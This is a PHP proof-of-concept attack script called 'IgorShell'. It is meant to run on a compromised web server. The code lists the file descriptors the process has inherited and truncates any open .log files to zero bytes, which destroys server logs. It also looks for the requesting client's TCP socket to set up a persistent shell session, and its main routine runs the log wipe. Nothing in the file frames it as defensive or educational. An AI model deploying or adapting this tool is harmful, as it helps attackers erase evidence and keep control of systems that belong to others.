<?php

/*
 *	Fd PoC
 *	Author: Brian Heese
 *	Date: 05-08-2013
 */

// Disable timing out as we wish to facilitate a statefull shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

class IgorShell {

	private $m_Pid;
	private $m_Nice;
	private $m_FileDescriptors;
	private $m_BossIp;
	private $m_BossPort;
	private $m_BossSock;

	public function __construct() {
		echo $this->m_Pid 				= getmypid();
		$this->m_Nice 				= $this->getProcessNice();
		$this->m_FileDescriptors	= array();
		$this->m_BossIp				= $_SERVER['REMOTE_ADDR'];
		$this->m_BossPort			= $_SERVER['REMOTE_PORT'];
	}

	/**
	 *	Fetch current process priority
	 *	0 is highest, thus the higher the number
	 *	the lower the priority of the process.
	 */
	private function getProcessNice ($pid = null) {

	    if (!$pid) {
	        $pid = $this->m_Pid;
	    }
	    
	    // Execute ps -p [pid] -o %p %n in shell    
	    $res = `ps -p $pid -o "%p %n"`;
	    
	    // Fetch info we want from output    
	    preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);
	    
	    // Return Pid and priority    
	    return array ('pid' => (isset ($matches[1]) ? $matches[1] : null), 'nice' => (isset ($matches[2]) ? $matches[2] : null));
	}

	/**
	 *	Method which enumerates all inherited file descriptors
	 *	and looks up all relevant info for each.
	 *	Dep: PHP >= 5.3.6
	 */
	private function getFileDescriptors(  ) {

		$it = new DirectoryIterator("glob:///proc/self/fd/*");
		foreach($it as $f) {

			$tmpArr = array();

			// Create resource from fd
			$tmpArr['fd'] 		= $fd = fopen("php://fd/" . $f->getFilename(), 'r+');

			// Determine type
		    $details 			= stream_get_meta_data($fd);
		    $tmpArr['type'] 	= $details['stream_type'];

		    // Determine Blocked / Non-Blocked state
		    $tmpArr['state'] 	= $details['blocked'];

		    // Determine uri
		    $tmpArr['uri'] 		= $details['uri'];

		    // fd mode
		    $tmpArr['mode']		= $details['mode'];

            // retrieve filepath
            $tmpArr['filepath'] = readlink('/proc/'.$this->m_Pid.'/fd/'.$f->getFilename());

            // Save
		    $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
		}	
	}

	public function printFileDescriptors(  ) {
		
		if(!$this->m_FileDescriptors)
			$this->getFileDescriptors();

		foreach ( $this->m_FileDescriptors as $id => $fd ) {
			echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
		}

        echo "<hr/>".var_dump($this->m_FileDescriptors).'<br/>';
	}

	public function whipeLog( $fd = null ) {
		
		// Default fd for log. If NULL ,retrieve logfiles from internal file descripters.
		if( $fd == null ){
            $logfiles = $this->getLogFiles();
        }else{
            $logfiles[]=$fd;
        }
        foreach($logfiles as $key => $props){
            if(!is_resource($props['fd'])) continue;

            $oldsize=fread($props['fd'], 100);
            if($oldsize!==false){
                // Truncate filesize to 0 & close resource
                if(ftruncate($props['fd'] , 0)){
                    $newsize=fread($props['fd'], 100);
                    if($newsize<$oldsize||$newsize==false)
                        echo 'Log is empty: '.$props['filepath'].'!<br/>';
                    
                }
            }else
                echo 'File is already < 100 kb.';
            fclose($props['fd']);
        }
	}

    private function getLogFiles(){
        foreach($this->m_FileDescriptors as $fd => $props){
            if(substr($props['filepath'], -4)=='.log'){
                $logfiles[$fd] = $props;
            }
        }
        //print_r($logfiles);

        return $logfiles;
    }


	/**
	 *	Method that reads contents of log file referenced by fd
	 *	performs some basic manipulations on the data and
	 *	overwrites the log with manipulated version.
	 */
	private function editLog( $fd = null ) {
		// TODO: implement me.
	}

	/**
	 *	Findsock method iterates over socket descriptors found
	 *	untill it's found the requesting socket.
	 */
	public function findSock() {
		
		if(!$this->m_FileDescriptors)
			$this->getFileDescriptors();

		echo '<br />Searching for socket from ip: ' . $this->m_BossIp . ':' . $this->m_BossPort . '<br />';

		foreach( $this->m_FileDescriptors as $id => $d ) {

			// Skip if fd is not a socket
			if( $d['type'] != 'tcp_socket' )
				continue;

			$remote = stream_socket_get_name($d['fd'], true);
			
			if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {

				// Sock found!
				$this->s_BossSock = $d['fd'];
				echo 'Found sock! #' . $id . '<br />';
				break;
			}
		}
	}

}

$is = new IgorShell();
//$is->findSock();
$is->printFileDescriptors();
$is->whipeLog();
echo 'done';



